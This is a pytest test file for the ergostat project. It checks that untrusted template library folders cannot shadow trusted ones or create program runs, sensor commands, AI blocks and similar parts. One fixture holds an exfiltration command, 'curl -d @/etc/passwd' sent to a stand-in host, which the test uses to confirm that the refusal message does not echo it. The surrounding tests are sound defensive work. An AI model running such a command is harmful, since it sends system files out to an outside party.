"""Library folders the owner did not mark trusted (SPEC §2a, docs/SECURITY.md *Libraries you did not write*): a
``library:`` map entry is untrusted unless it says ``trust: owner``; its templates never shadow a trusted one; and a
use whose chain holds one may make only what ``ergostat/library/trust.py`` allows, or the whole chain is refused at the
owner's ``use:`` line."""

import ast
import re
import textwrap
from pathlib import Path

import pytest

from ergostat.actions import compile as actions_compile
from ergostat.leases import compile as leases_compile
from ergostat.library import author, trust
from ergostat.library import templates as tp
from ergostat.library.expand import USE_KEYS
from ergostat.spec import compile as spec_compile
from ergostat.spec import read
from ergostat.spec.load import SECTIONS, load
from ergostat.workspaces import compile as workspaces_compile

ROOT = Path(__file__).resolve().parent.parent

SHAPE = """
template: shape
description: structure only
items:
  ticket:
    id: "${name}-ticket/*"
    states: [open, done]
    on: {ticket.closed: done}
stocks:
  open:
    unit: items
    sensor: {items: "${name}-ticket", state: open}
flows:
  closing:
    from: open
    unit: items
    sensor: {items: "${name}-ticket", leaving: open, over: 1h}
goals:
  few:
    stock: open
    hold: "<= 10"
blocks:
  gate:
    type: onoff
    in: stock.open
    goal: few
"""


def write(root: Path, main: str, folders: dict[str, dict[str, str]]) -> Path:
    for folder, temps in folders.items():
        (root / folder).mkdir(parents=True, exist_ok=True)
        for name, text in temps.items():
            (root / folder / f"{name}.yaml").write_text(textwrap.dedent(text))
    (root / "ergostat.yaml").write_text(textwrap.dedent(main))
    return root / "ergostat.yaml"


def use_line(path: Path, inst: str = "u") -> int:
    lines = path.read_text().splitlines()
    at = next(i for i, x in enumerate(lines) if x.strip() == f"{inst}:")
    return next(i for i, x in enumerate(lines) if i > at and x.strip().startswith("use:")) + 1


def errors(path: Path):
    _, ps = read(path)
    return [p for p in ps if p.level == "error"]


def nothing_of(doc, prefix: str = "u") -> None:
    """No part, system or use of the chain is in the document, at any depth."""
    made = [(s, n) for s, entries in doc.sections.items() for n in entries if n == prefix or n.startswith(prefix + "-")]
    assert made == [] and not [n for n in doc.uses if n == prefix or n.startswith(prefix + "-")]
    assert not [k for k in doc.defined if k[0] == "uses" and k[1].startswith(prefix + "-")]


MAIN = """
name: t
library: [{folder: lib}]
uses:
  u:
    use: bad
"""


def refused_once(path: Path) -> str:
    errs = errors(path)
    assert [(e.code, e.where.line, e.where.file.name) for e in errs] == [("library-untrusted", use_line(path), "ergostat.yaml")], errs
    nothing_of(load(path))
    return errs[0].message


# ---- the folder's form


def test_library_map_entry_is_untrusted_by_default(tmp_path, monkeypatch):
    write(tmp_path, """
        name: t
        library: [{folder: a}, {folder: b, trust: owner}, c]
        """, {"a": {"ta": "template: ta\n"}, "b": {"tb": "template: tb\n"}, "c": {"tc": "template: tc\n"},
              "d": {"td": "template: td\n"}})
    monkeypatch.setenv("ERGOSTAT_LIBRARY", str(tmp_path / "d"))
    doc = load(tmp_path / "ergostat.yaml")
    got, _ = tp.find_all(doc.library, doc.untrusted)
    assert {n: got[n].trust for n in ("ta", "tb", "tc", "td", "collect")} == {
        "ta": "untrusted", "tb": "owner", "tc": "owner", "td": "owner", "collect": "ergostat"}
    shown = {t["template"]: t["trust"] for t in author.library(tmp_path)["templates"]}
    assert {n: shown[n] for n in ("ta", "tb", "tc", "td", "collect")} == {
        "ta": "untrusted", "tb": "owner", "tc": "owner", "td": "owner", "collect": "ergostat"}
    assert author.library(tmp_path, "ta")["trust"] == "untrusted" and got["tb"].summary()["trust"] == "owner"
    assert not tp.trusted(tp.Template("x", tmp_path, False))          # a template whose trust was never set


@pytest.mark.parametrize("entry", ["{folder: a, trust: yes}", "{path: a}", "{folder: a, extra: 1}", "{folder: a, trust: null}",
                                   "{folder: [a]}", "{trust: owner}"])
def test_library_map_entry_bad_key_or_trust_is_an_error(tmp_path, entry):
    path = write(tmp_path, f"""
        name: t
        library:
          - {entry}
        uses:
          u:
            use: ta
        """, {"a": {"ta": "template: ta\nstocks:\n  s: {unit: u}\n"}})
    errs = errors(path)
    bad = [e for e in errs if e.code == "bad-library"]
    assert len(bad) == 1 and bad[0].where.line == 4, errs
    assert [e.code for e in errs if e.code != "bad-library"] == ["unknown-template"]     # its templates: not loaded
    assert load(path).library == []


# ---- no shadowing

OWN = "template: mine\ndescription: the owner's\nstocks:\n  s: {unit: u}\n"
COPY = "template: mine\ndescription: a copy\nstocks:\n  s: {unit: u}\n"
COLLECT = "template: collect\ndescription: a copy\nstocks:\n  s: {unit: u}\n"


@pytest.mark.parametrize("order", ["untrusted-first", "untrusted-last"])
def test_untrusted_never_shadows_builtin_or_owner(tmp_path, order):
    tmp_path = tmp_path.resolve()
    folders = ["{folder: lib}", "own"] if order == "untrusted-first" else ["own", "{folder: lib}"]
    path = write(tmp_path, f"""
        name: t
        library: [{', '.join(folders)}]
        uses:
          m:
            use: mine
          c:
            use: collect
          w:
            use: wraps
        """, {"lib": {"mine": COPY, "collect": COLLECT},
              "own": {"mine": OWN, "wraps": "template: wraps\nuses:\n  inner:\n    use: collect\n"}})
    doc = load(path)
    assert doc.uses["m"]["path"] == str(tmp_path / "own" / "mine.yaml") and doc.uses["m"]["trust"] == "owner"
    assert doc.uses["c"]["trust"] == "ergostat" and doc.uses["w-inner"]["trust"] == "ergostat"
    notes = [p.message for p in doc.problems if p.code == "template-library"]
    assert any(str(tmp_path / "lib" / "mine.yaml") in n and "is not used" in n for n in notes), notes
    assert any(str(tmp_path / "lib" / "collect.yaml") in n and "is not used" in n for n in notes), notes
    assert not [e for e in errors(path) if e.code == "library-untrusted"]   # a trusted chain naming that name: not held


def test_untrusted_first_wins_between_untrusted(tmp_path):
    write(tmp_path, "name: t\nlibrary: [{folder: a}, {folder: b}]\n", {"a": {"x": COPY}, "b": {"x": OWN}})
    doc = load(tmp_path / "ergostat.yaml")
    got, _ = tp.find_all(doc.library, doc.untrusted)
    assert got["mine"].description == "a copy" and got["mine"].trust == "untrusted"


@pytest.mark.parametrize("order", ["parent-first", "child-first"])
def test_untrusted_subfolder_of_a_trusted_folder_stays_untrusted(tmp_path, order):
    """lib/shared/template.yaml is reached through the trusted lib (its */template.yaml) and the untrusted lib/shared:
    the file's own trust decides, so the owner's untrusted mark is never dropped, in either order."""
    tmp_path = tmp_path.resolve()
    folders = ["lib", "{folder: lib/shared}"] if order == "parent-first" else ["{folder: lib/shared}", "lib"]
    path = write(tmp_path, f"""
        name: t
        library: [{', '.join(folders)}]
        uses:
          u:
            use: bad
        """, {"lib": {"mine": OWN}, "lib/shared": {"template": BASE + CASES["program-run"][0], "copy": COPY}})
    assert "blocks.u-x.run" in refused_once(path)
    doc = load(path)
    notes = [p.message for p in doc.problems if p.code == "template-library"]
    assert any(str(tmp_path / "lib" / "shared" / "copy.yaml") in n and "is not used" in n for n in notes), notes
    for n in notes:                     # a note never names one file as both the skipped and the used
        m = re.match(r"template \S+: (\S+) \(from a folder not marked trusted\) is not used; (.+) is$", n)
        assert m is None or m.group(1) != m.group(2), n


# ---- what a held chain may make


def test_untrusted_structure_only_template_expands(tmp_path):
    path = write(tmp_path, MAIN.replace("bad", "shape"), {"lib": {"shape": SHAPE}})
    spec, ps = read(path)
    assert not [p for p in ps if p.level == "error"], ps
    assert {"u-open"} <= set(spec.stocks) and "u-closing" in spec.flows and "u-few" in spec.goals
    assert spec.blocks["u-gate"].type == "onoff" and "u-ticket" in spec.items


BASE = "template: bad\ndescription: d\nparams:\n  how: {type: map, default: {run: echo 1}}\nstocks:\n  s: {unit: u}\n"
CASES = {
    "program-run": ("blocks:\n  x: {type: program, run: echo hi}\n", "blocks.u-x.run"),
    "ai": ("blocks:\n  x: {type: ai, prompt: hi}\n", "blocks.u-x.type"),
    "person-ask": ("blocks:\n  x: {type: person, ask: hi}\n", "blocks.u-x.type"),
    "external": ("blocks:\n  x: {type: external, agent: a}\n", "blocks.u-x.type"),
    "judge": ("blocks:\n  x: {type: judge}\n", "blocks.u-x.type"),
    "no-type": ("blocks:\n  x: {in: stock.s, goal: g}\n", "blocks.u-x.type"),
    "on-stale": ("blocks:\n  x: {type: onoff, goal: g, on-stale: hold}\n", "blocks.u-x.on-stale"),
    "sensor-run": ("flows:\n  f: {to: s, sensor: {run: echo 1}}\n", "flows.u-f.sensor.run"),
    "sensor-query": ("flows:\n  f: {to: s, sensor: {query: {expr: up}}}\n", "flows.u-f.sensor.query"),
    "sensor-daemon": ("auxiliaries:\n  a: {sensor: {daemon: x}}\n", "auxiliaries.u-a.sensor.daemon"),
    "sensor-every": ("stocks:\n  t: {unit: u, sensors: {n: {items: k, every: 1s}}}\n", "stocks.u-t.sensors.n.every"),
    "sensor-parse": ("stocks:\n  t: {unit: u, sensor: {items: k, parse: x}}\n", "stocks.u-t.sensor.parse"),
    "agents": ("agents:\n  bob: {kind: person}\n", "agents"),
    "workspaces": ("workspaces:\n  w: {type: git, repo: .}\n", "workspaces"),
    "actions": ("actions:\n  push: {run: echo}\n", "actions"),
    "parameter-inferred": ("parameters:\n  x: {value: 1, inferred: true}\n", "parameters.u-x.inferred"),
    "item-lease": ("items:\n  k: {id: k/*, lease: {ttl: 1h}}\n", "items.u-k.lease"),
    "goal-owner": ("goals:\n  g: {stock: s, hold: '<= 1', owner: ana}\n", "goals.u-g.owner"),
    "after-substitution": ("stocks:\n  t:\n    unit: u\n    sensor: ${how}\n", "stocks.u-t.sensor.run"),
    "map-under-a-value": ("stocks:\n  t: {unit: {run: echo 1}}\n", "stocks.u-t.unit"),
    "list-under-a-value": ("goals:\n  g: {stock: s, hold: [{run: echo 1}]}\n", "goals.u-g.hold"),
}


@pytest.mark.parametrize("case", list(CASES))
def test_untrusted_refused_at_use_line(tmp_path, case):
    body, where = CASES[case]
    path = write(tmp_path, MAIN, {"lib": {"bad": BASE + body}})
    msg = refused_once(path)
    assert f"makes {where}," in msg and "template bad" in msg and str((tmp_path / "lib").resolve()) in msg


OWNER_PARTS = """
blocks:
  deploy: {type: program, run: echo deploying}
stocks:
  queue: {unit: items}
goals:
  short: {stock: queue, hold: "<= 5"}
"""


@pytest.mark.parametrize("out, where", [("block.deploy", "blocks.u-x.out"), ("goal.short", "blocks.u-x.out"),
                                        ("[block.gate, block.deploy]", "blocks.u-x.out.1"),
                                        ("auxiliary.nowhere", "blocks.u-x.out"), ("'not a ref'", "blocks.u-x.out")])
def test_untrusted_out_to_a_part_it_did_not_make_refused(tmp_path, out, where):
    """An allowed block's out: commands the block it names (the owner's program block would run on the library's
    timer) and sets the goal it names: a held chain's out: may name only parts the chain made."""
    body = ("blocks:\n  gate: {type: compare, above: 1, in: stock.s}\n"
            f"  x: {{type: timer, after: 1h, in: stock.s, out: {out}}}\n")
    path = write(tmp_path, MAIN + OWNER_PARTS, {"lib": {"bad": BASE + body}})
    msg = refused_once(path)
    assert f"makes {where}," in msg, msg
    spec, _ = read(path)
    assert "deploy" in spec.blocks and not [c for c in spec.commanders_of("deploy")]


def test_untrusted_out_to_its_own_part_compiles(tmp_path):
    body = ("goals:\n  g: {stock: s, hold: '<= 3'}\n"
            "blocks:\n  gate: {type: onoff, in: stock.s, goal: g}\n"
            "  x: {type: timer, after: 1h, in: stock.s, out: [block.gate, goal.g]}\n")
    path = write(tmp_path, MAIN + OWNER_PARTS, {"lib": {"bad": BASE + body}})
    spec, ps = read(path)
    assert not [p for p in ps if p.level == "error"], ps
    assert {str(r) for r in spec.blocks["u-x"].outputs["out"]} == {"block.u-gate", "goal.u-g"}


def test_untrusted_unknown_key_refused(tmp_path):
    path = write(tmp_path, MAIN, {"lib": {"bad": BASE + "blocks:\n  x: {type: onoff, goal: g, zzz: 1}\n"}})
    assert "blocks.u-x.zzz" in refused_once(path)


def test_untrusted_wrapping_builtin_with_run_refused(tmp_path):
    path = write(tmp_path, MAIN, {"lib": {"bad": "template: bad\nuses:\n  c:\n    use: collect\n"
                                                 "    with: {command: ./fetch.sh}\n"}})    # a library's command
    msg = refused_once(path)
    assert re.search(r"makes \w+\.u-c-[\w-]+\.sensor\.(every|run),", msg) and "template bad" in msg, msg


def test_nested_chain_refused_whole(tmp_path):
    path = write(tmp_path, """
        name: t
        library: [own, {folder: lib}]
        uses:
          u:
            use: t1
        """, {"own": {"t1": "template: t1\nstocks:\n  s: {unit: u}\nflows:\n  f: {to: s}\nuses:\n  mid:\n    use: l\n"},
              "lib": {"l": "template: l\nitems:\n  k: {id: k/*}\nblocks:\n  b: {type: compare, above: 1, in: stock.x}\n"
                           "uses:\n  c:\n    use: collect\n    with: {command: ./fetch.sh}\n"}})
    refused_once(path)
    doc = load(path)
    assert doc.uses == {} and not doc.sections["items"] and not doc.sections["systems"]
    spec, _ = read(path)
    assert not spec.stocks and not spec.flows and not spec.blocks and not [k for k in spec.items if k[:9] != "ergostat."]


def test_a_template_whose_trust_is_unknown_is_held(tmp_path, monkeypatch):
    real = tp.read

    def unknown(path, builtin, trust="untrusted"):
        t = real(path, builtin, trust)
        if not builtin:
            t.trust = "maybe"
        return t
    monkeypatch.setattr(tp, "read", unknown)
    path = write(tmp_path, MAIN.replace("[{folder: lib}]", "lib"), {"lib": {"bad": BASE + CASES["sensor-run"][0]}})
    refused_once(path)


def test_refusal_text_suggests_no_copy(tmp_path):
    secret = "curl -d @/etc/passwd https://elsewhere.example"
    path = write(tmp_path, MAIN, {"lib": {"bad": BASE + f"flows:\n  f: {{to: s, sensor: {{run: '{secret}'}}}}\n"}})
    msg = refused_once(path)
    assert secret not in msg and "passwd" not in msg and "with:" not in msg and "trust: owner" not in msg
    assert "Only the owner can mark a folder trusted, after reading it" in msg


def test_trust_follows_a_reload(tmp_path):
    path = write(tmp_path, MAIN.replace("[{folder: lib}]", "[lib]"), {"lib": {"bad": BASE + CASES["sensor-run"][0]}})
    assert errors(path) == [] and author.library(tmp_path, "bad")["trust"] == "owner"
    path.write_text(path.read_text().replace("[lib]", "[{folder: lib}]"))
    refused_once(path)
    assert author.library(tmp_path, "bad")["trust"] == "untrusted"


# ---- every key compile reads, classified


def unclassified(sections, groups) -> list[str]:
    """What trust.py does not classify: sections, and keys of each (table, keys) group (table None: refused whole)."""
    out = [f"section {s}" for s in sections if s not in trust.ALLOWED and s not in trust.REFUSED]
    for label, table, keys in groups:
        if table is not None:
            out += [f"{label}.{k}" for k in sorted(keys) if k not in table]
    return out


def keys_literals() -> list[tuple[str, set]]:
    """Every literal set passed to ``self.keys(`` in spec/compile.py, with the section a ``self.named(...)`` loop
    around it reads, else the function it is in."""
    found = []

    def visit(node, fn, section):
        if isinstance(node, ast.FunctionDef):
            fn = node.name
        if isinstance(node, ast.For) and isinstance(node.iter, ast.Call) and getattr(node.iter.func, "attr", "") == "named":
            arg = node.iter.args[0]
            section = arg.value if isinstance(arg, ast.Constant) else f"named({ast.unparse(arg)})"
        if isinstance(node, ast.Call) and getattr(node.func, "attr", "") == "keys" and len(node.args) > 1:
            for s in ast.walk(node.args[1]):
                if isinstance(s, ast.Set):
                    found.append((section or fn, {e.value for e in s.elts}))
        for child in ast.iter_child_nodes(node):
            visit(child, fn, section)
    visit(ast.parse((ROOT / "ergostat/spec/compile.py").read_text()), None, None)
    return found


def test_every_compile_key_classified():
    sections = set(tp.BODY) | set(SECTIONS)
    assert sections == set(trust.ALLOWED) | set(trust.REFUSED) and not set(trust.ALLOWED) & set(trust.REFUSED)
    c = spec_compile
    blocks = {**trust.BLOCK, **{k: v for t in trust.BLOCK_TYPES.values() for k, v in t.items()}}
    assert set(c.TYPE_KEYS) == set(trust.BLOCK_TYPES) | set(trust.REFUSED_TYPES)
    assert not set(trust.BLOCK_TYPES) & set(trust.REFUSED_TYPES)
    groups = [("sensor", trust.SENSOR, c.SENSOR_KEYS | c.ITEM_SENSOR_KEYS), ("items", trust.ITEM, c.ITEM_KEYS),
              ("stocks", trust.STOCK, c.STOCK_KEYS), ("flows", trust.FLOW, c.FLOW_KEYS),
              ("driven-by", trust.LINK, c.LINK_KEYS), ("goals", trust.GOAL, c.GOAL_KEYS),
              ("process", trust.PROCESS, c.PROCESS_KEYS), ("auxiliaries", trust.AUXILIARY, c.AUXILIARY_KEYS),
              ("parameters", trust.PARAMETER, c.PARAMETER_KEYS), ("agents", None, c.AGENT_KEYS),
              ("blocks", trust.BLOCK, c.BLOCK_COMMON), ("uses", trust.USE, USE_KEYS),
              ("actions", None, actions_compile.ACTION_KEYS), ("workspaces", None, workspaces_compile.POOL_KEYS),
              ("leases", None, leases_compile.TERMS_KEYS),
              ("blocks.program/ai", None, set(actions_compile.SANDBOX_KEYS) | leases_compile.TAKES_KEYS | c.LAW_KEYS),
              ("items.lease", None, leases_compile.TERMS_KEYS)]
    for t, keys in c.TYPE_KEYS.items():
        groups.append((f"blocks.{t}", trust.BLOCK_TYPES.get(t), keys))
        if t in trust.BLOCK_TYPES:
            assert all(blocks[k][0] != trust.NO for k in trust.BLOCK_TYPES[t]), t
    assert trust.ITEM["lease"][0] == trust.NO and trust.REFUSED.get("leases")
    by = {"systems": trust.SYSTEM, "sensors": trust.SENSOR, "claims": None, "loops": None, "intent_policy": None,  # judge
          "messages": None,                                       # messages: main file only, not a section a template writes
          "budget": None}                                         # budget: main file only (SPEC §9.9), not in BODY
    lits = keys_literals()
    assert {w for w, _ in lits} <= set(by), lits                  # a new self.keys( site: classify it here
    assert {"systems", "sensors", "claims", "loops"} <= {w for w, _ in lits}     # the scan finds them
    groups += [(w, by[w], keys) for w, keys in lits]
    assert unclassified(sections, groups) == []
    assert all(len(v) == 2 and v[1] for tbl in (*trust.ALLOWED.values(), *trust.BLOCK_TYPES.values(), trust.SENSOR,
                                                    trust.LINK, trust.PROCESS, trust.REL, trust.JOIN) for v in tbl.values())
    # the checker fails when compile gains a section or a key
    assert unclassified([*sections, "zzz-section"], [("sensor", trust.SENSOR, c.SENSOR_KEYS | {"zzz-key"})]) == [
        "section zzz-section", "sensor.zzz-key"]


def test_security_lists_what_trust_allows():
    text = (ROOT / "docs/SECURITY.md").read_text().split("## Libraries you did not write", 1)[1].split("\n## ", 1)[0]

    def listed(label):
        item = re.search(rf"^- \*\*{label}:\*\*.*?(?=^\S|\Z)", text, re.S | re.M).group(0)   # with its wrapped lines
        return set(re.findall(r"`([a-z-]+)`", item))
    assert listed("Sections") == set(trust.ALLOWED)
    assert listed("Block types") == set(trust.BLOCK_TYPES)
    assert listed("Sensor keys") == {k for k, v in trust.SENSOR.items() if v[0] != trust.NO}
